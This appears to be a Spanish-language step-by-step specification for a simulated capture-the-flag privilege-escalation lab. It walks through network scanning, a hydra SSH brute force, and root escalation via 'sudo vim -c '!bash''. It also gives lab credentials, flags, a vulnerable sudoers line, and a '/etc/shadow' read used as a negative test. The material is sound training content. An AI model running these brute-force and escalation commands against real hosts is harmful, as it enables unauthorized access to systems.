# Escenario 05 - Privilege Escalation Lab
## Flujo de pasos y validaciones

---

## **STEP 01: Reconocimiento de red**
**Comando:** `arp-scan 192.168.30.0/24`

**Descripción:** Descubrir hosts activos en la red objetivo.

**Info máquina víctima (NetworkMap):**
- Estado: Descubierto
- IP: Oculta (se muestra después de arp-scan)
- MAC: Oculta (se muestra después de arp-scan)
- SO: Desconocido (se revela en step 2)
- Puertos: Desconocidos

**Al hacer click en la máquina víctima:**
- Muestra IP y MAC obtenidas del arp-scan
- No muestra sistema operativo ni puertos (esto se obtiene en step 2 con nmap)

**Validación step01:**
- Ejecución exitosa del comando arp-scan
- Completar la misión 1

---

## **STEP 02: Escaneo de puertos**
**Comando:** `nmap -sV 192.168.30.11`

**Descripción:** Identificar servicios corriendo en el host objetivo.

**Info máquina víctima (NetworkMap):**
- Estado: Escaneado
- IP: 192.168.30.11
- MAC: 08:00:27:E8:F9:0A
- SO: Ubuntu 20.04 LTS (se revela después de nmap)
- Puertos: 22/tcp ssh, 80/tcp http

**Al hacer click en la máquina víctima:**
- Muestra IP, MAC, sistema operativo y puertos abiertos

**Validación step02:**
- Ejecución exitosa del comando nmap -sV
- Completar la misión 2

---

## **STEP 03: Fuerza bruta SSH**
**Comando:** `hydra -l developer -P rockyou.txt 192.168.30.11 ssh`

**Descripción:** Obtener credenciales de acceso mediante fuerza bruta.

**Info máquina víctima (NetworkMap):**
- Estado: Enumerado
- IP: 192.168.30.11
- SO: Ubuntu 20.04 LTS
- Puertos: 22/tcp ssh, 80/tcp http
- Credenciales: developer / dev2024 (encontradas por hydra)

**Al hacer click en la máquina víctima:**
- Muestra IP, MAC, SO, puertos y credenciales encontradas
- Estado: Credenciales encontradas (no verificadas aún)

**Validación step03:**
- Ejecución exitosa del comando hydra
- Output contiene: "login: developer" y "password: dev2024"
- Completar la misión 3

---

## **STEP 04: Acceso SSH**
**Comando:** `ssh developer@192.168.30.11 dev2024`

**Descripción:** Conectarse a la máquina víctima con las credenciales obtenidas.

**Info máquina víctima (NetworkMap):**
- Estado: Acceso concedido
- IP: 192.168.30.11
- SO: Ubuntu 20.04 LTS
- Puertos: 22/tcp ssh, 80/tcp http
- Credenciales: developer / dev2024 ✅ VERIFICADAS
- Sesión: SSH activa como developer

**Al hacer click en la máquina víctima:**
- Muestra toda la información + credenciales verificadas + sesión SSH activa

**Cambios en Terminal:**
- Prompt cambia de `root@kali-attacker:~#` a `developer@privesc-lab:~$`
- Ahora se ejecutan comandos en la máquina víctima

**Validación step04:**
- Ejecución exitosa del comando ssh
- Output contiene: "Welcome to Ubuntu"
- Cambio de máquina activa a la víctima
- Completar la misión 4

---

## **STEP 05: Enumeración de sudo**
**Comando:** `sudo -l`

**Descripción:** Listar los permisos de sudo del usuario actual (developer).

**Info máquina víctima (NetworkMap):**
- Estado: Acceso concedido
- Sesión: SSH activa como developer
- Privilegios: Enumerando...

**Output esperado:**
```
User developer may run the following commands on privesc-lab:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Validación step05:**
- Ejecución exitosa del comando sudo -l
- Output muestra permisos NOPASSWD para /usr/bin/vim
- Completar la misión 5

---

## **STEP 06: Escalada de privilegios**
**Comando:** `sudo vim -c '!bash'`

**Descripción:** Aprovechar que vim tiene permisos NOPASSWD como root para escalar privilegios.

**Info máquina víctima (NetworkMap):**
- Estado: COMPROMETIDA 🔥
- Sesión: ROOT ACCESS
- Privilegios: uid=0(root)

**Cambios en Terminal:**
- Prompt cambia de `developer@privesc-lab:~$` a `root@privesc-lab:~#`
- Ahora se ejecutan comandos como root

**Output esperado:**
```
root@privesc-lab:~# whoami
root
root@privesc-lab:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Validación step06:**
- Ejecución exitosa del comando sudo vim
- Output contiene: "root" y "uid=0"
- Cambio de usuario a root
- Completar la misión 6

---

## **STEP 07: Capturar la flag de root**
**Comando:** `cat /root/root.txt`

**Descripción:** Leer la flag final como usuario root.

**Info máquina víctima (NetworkMap):**
- Estado: COMPROMETIDA ✅
- Flag: Capturada

**Output esperado:**
```
ZIL{SUDO_VIM_PRIVESC_COMPLETE}
```

**Validación step07:**
- Ejecución exitosa del comando cat
- Output contiene la flag
- Completar la misión 7 (FINAL)

---

## **RESUMEN DEL FLUJO**

| Paso | Comando | Descripción | Discovery Level |
|------|---------|-------------|-----------------|
| 1 | `arp-scan 192.168.30.0/24` | Descubrir host | 1 |
| 2 | `nmap -sV 192.168.30.11` | Escanear servicios | 2 |
| 3 | `hydra -l developer -P rockyou.txt ...` | Fuerza bruta SSH | 3 |
| 4 | `ssh developer@192.168.30.11 dev2024` | Acceso inicial | 3 |
| 5 | `sudo -l` | Enumerar permisos sudo | 3 |
| 6 | `sudo vim -c '!bash'` | Escalar a root | 4 |
| 7 | `cat /root/root.txt` | Capturar flag | 4 |

---

## **VALIDACIONES DE SEGURIDAD**

### Validación: SSH sin fuerza bruta
**Comando:** `ssh developer@192.168.30.11 dev2024` (sin ejecutar hydra primero)
**Resultado esperado:** ❌ Error - "Primero descubre credenciales con: hydra"

### Validación: Comando sudo sin permisos
**Comando:** `sudo cat /etc/shadow` (vim es el único comando permitido)
**Resultado esperado:** ❌ Error - "password required" o "not in sudoers"

### Validación: Escalada incorrecta
**Comando:** `sudo /bin/bash` (no vim)
**Resultado esperado:** ❌ Error - "not in sudoers file"

---

## **DATOS DEL ESCENARIO**

**Credenciales:**
- Usuario: `developer`
- Password: `dev2024`

**Flags:**
- User flag: `/home/developer/user.txt` → `ZIL{SSH_ACCESS_DEVELOPER}`
- Root flag: `/root/root.txt` → `ZIL{SUDO_VIM_PRIVESC_COMPLETE}`

**Configuración sudoers vulnerable:**
```
developer ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**Vector de escalada:**
- vim con permisos NOPASSWD permite ejecutar comandos shell internos
- `:!bash` desde vim abre una shell como root
